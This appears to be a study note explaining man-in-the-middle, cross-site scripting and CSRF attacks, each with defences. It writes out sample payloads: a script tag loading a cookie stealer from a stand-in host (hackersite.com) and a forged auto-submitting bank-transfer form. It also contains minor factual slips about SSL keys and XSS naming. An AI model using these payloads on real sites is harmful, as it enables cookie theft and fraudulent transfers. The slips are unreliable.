# Attacks
# Man In The Middle (MITM)

## What is it?


A type of cyberattack where the attacker secretly relays and possibly alters the communication between two parties who believe they are directly communicating with each other.


![Image](https://www.digicert.com/wp-content/uploads/2017/05/phishing-mitm.png)


### Examples:


* Let’s say you connect to a malicious wireless router — perhaps a ***router offering free Wi-Fi in a public location*** 
* You then attempt to connect to your bank’s website
* The attacker sets up a fake server, fetches the bank webpage, modifies it and presents it to you
* You sign into your bank and perform transactions like you normally would. Everything seems to be fine
* The bank sends account details and information to the attacker
* Sends bank details to you to avoid detection, and keeps eavesdropping on sensitive information until attacker gathers what he wants


## Solutions:


+ Avoiding WiFi connections that aren’t password protected.
+ Paying attention to browser notifications reporting a website as being unsecured.
+ Immediately logging out of a secure application when it’s not in use.
+ Not using public networks (e.g., coffee shops, hotels) when conducting sensitive transactions.


+ Hyper Text Transfer Protocol Secure (HTTPS) is the secure version of HTTP , which encrypts communication
+ Use certificate-based authentication,which is the use of a Digital Certificate to identify a user, machine, or device before granting access to a resource, network, application, etc.
+ Use SSL, which uses asymmetric key pair: the public key, used for encryption and the private key, used for decryption. MITM won't be able to decrypt any messages between exisiting two parties because he won't have the public key



# Cross Site Scripting (XSS)

It is a type of computer security vulnerability typically found in web applications

The attack injects malicious code into a vulnerable web application. 
It does not directly target the application itself but the users of the web application.

When a victim views an infected page on the website, the injected code executes in the victim's browser. Consequently, the attacker has bypassed the browser's ***same origin policy*** and is able to steal private information from a victim associated with the website. 

The aim is to enable the perpetrator to ***steal their session cookies*** and hijack their accounts.

Cross site scripting attacks can be broken down into two types: ***stored*** and ***reflected***.

## Stored XSS

Also known as persistent XSS, is the more damaging of the two. It occurs when a malicious script is injected directly into a vulnerable web application.

![Image](https://www.incapsula.com/images/illustrations/web-app-security-mini-site/sorted-XSS.png)
### Example:

While browsing an e-commerce website, a perpetrator discovers a vulnerability that allows HTML tags to be embedded in the site's comments section. The embedded tags become a permanent feature of the page, causing the browser to parse them with the rest of the source code every time the page is opened.

The attacker adds the following comment: 

```git
Great price for a great item! Read my review here <script src="http://hackersite.com/authstealer.js"> </script>.
```

From this point on, every time the page is accessed, the HTML tag in the comment will activate a JavaScript file, which is hosted on another site, and has the ability to steal visitors' session cookies.

Using the session cookie, the attacker can compromise the visitor’s account, granting him easy access to his personal information and credit card data. Meanwhile, the visitor, who may never have even scrolled down to the comments section, is not aware that the attack took place.

One of the most frequent targets are websites that allow users to share content, including blogs, social networks, video sharing platforms and message boards. Every time the infected page is viewed, the malicious script is transmitted to the victim's browser.



## Reflected (or persistent)

Reflected XSS involves the reflecting of a malicious script off of a web application, onto a user's browser. The script is embedded into a link, and is only activated once that link is clicked on.



![Image](https://www.incapsula.com/images/illustrations/web-app-security-mini-site/reflected-xss.png)


### Example


While visiting a forum site that requires users to log in to their account, a perpetrator executes this search query <script type='text/javascript'>alert('xss');</script> causing the following things to occur:

+ The query produces an alert box saying: "XSS".
+ The page displays: "<script type='text/javascript'>alert('XSS');</script > not found."
+ The page's URL reads http://ecommerce.com?q=<script type="text/javascript">alert('XSS'); </script>.

This tells the perpetrator that the website is vulnerable. Next, he creates his own URL, which reads:

```git
http://forum.com?q=news<\script%20src="http://hackersite.com/authstealer.js"
```
and embeds it as a link into a seemingly harmless email, which he sends to a group of forum users.


While the sending address and subject line may appear suspect to some, it does not mean that it won't be clicked on.

In fact, even if only one in every 1,000 recipients of the email click on the link, that still amounts to several dozen infected forum users. They will be taken to the forum's website, where the malicious script will be reflected back to their browser, enabling the perpetrator to steal their session cookies and hijack their forum accounts.



## Solutions

+ First and foremost, from the user's point-of-view, vigilance is the best way to avoid XSS scripting. 

+ Untrusted HTML input must be run through an HTML sanitization engine to ensure that it does not contain XSS code.

+ It is ultimately up to a website operator to prevent potential abuse to their users. This is done by blocking the user's requests. This is done to protect the user, as well as to prevent collateral damage to all other website visitors.

+ Stealing cookies can be mitigated by tying session cookies to the IP address of the user who originally logged in, then only permit that IP to use that cookie.

+ There are three classes of XSS defense that are emerging. These include Content Security Policy,[38] Javascript sandbox tools, and auto-escaping templates. These mechanisms are still evolving but promise a future of heavily reduced XSS attack occurrence.



# Cross Site Request Forgery (CSRF)


Cross site request forgery (CSRF), also known as XSRF, Sea Surf or Session Riding, is an attack vector that tricks a web browser into executing an unwanted action in an application to which a user is logged in.
![Image](https://www.incapsula.com/images/illustrations/web-app-security-mini-site/csrf-cross-site-request-forgery.png)
CSRFs are typically conducted using malicious social engineering, such as an email or link that tricks the victim into sending a forged request to a server. As the unsuspecting user is authenticated by their application at the time of the attack, it’s impossible to distinguish a legitimate request from a forged one.


Before executing an assault, a perpetrator typically studies an application in order to make a forged request appear as legitimate as possible.

For example, a typical GET request for a $100 bank transfer might look like:

```git
GET http://netbank.com/transfer.do?acct=PersonB&amount;=$100 HTTP/1.1
```


A hacker can modify this script so it results in a $100 transfer to their own account. Now the malicious request might look like:

```git
GET http://netbank.com/transfer.do?acct=AttackerA&amount;=$100 HTTP/1.1 
```

A bad actor can embed the request into an innocent looking hyperlink:

```git
<a href="http://netbank.com/transfer.do?acct=AttackerA&amount;=$100">Read more!</a>
```

Next, he can distribute the hyperlink via email to a large number of bank customers. Those who click on the link while logged into their bank account will unintentionally initiate the $100 transfer.

Note that if the bank’s website is only using POST requests, it’s impossible to frame malicious requests using a <a> href tag. However, the attack could be delivered in a <form> tag with automatic execution of the embedded JavaScript.


This is how such a form may look like:

```git
<body onload="document.forms[0].submit()">
   <form action="http://netbank.com/transfer.do" method="POST">
     <input type="hidden" name="acct" value="AttackerA"/>
     <input type="hidden" name="amount" value="$100"/>
     <input type="submit" value="View my pictures!"/>
   </form>
 </body>
```


## Solutions
+ Logging off web applications when not in use
+ Securing usernames and passwords
+ Not allowing browsers to remember passwords
+ Avoiding simultaneously browsing while logged into an application


+ Generate unique random tokens for every session request or ID. These are subsequently checked and verified by the server. Session requests having either duplicate tokens or missing values are blocked. Alternatively, a request that doesn’t match its session ID token is prevented from reaching an application.


+ Double submission of cookies is another well-known method to block CSRF. Similar to using unique tokens, random tokens are assigned to both a cookie and a request parameter. The server then verifies that the tokens match before granting access to the application.

+ Use custom rules
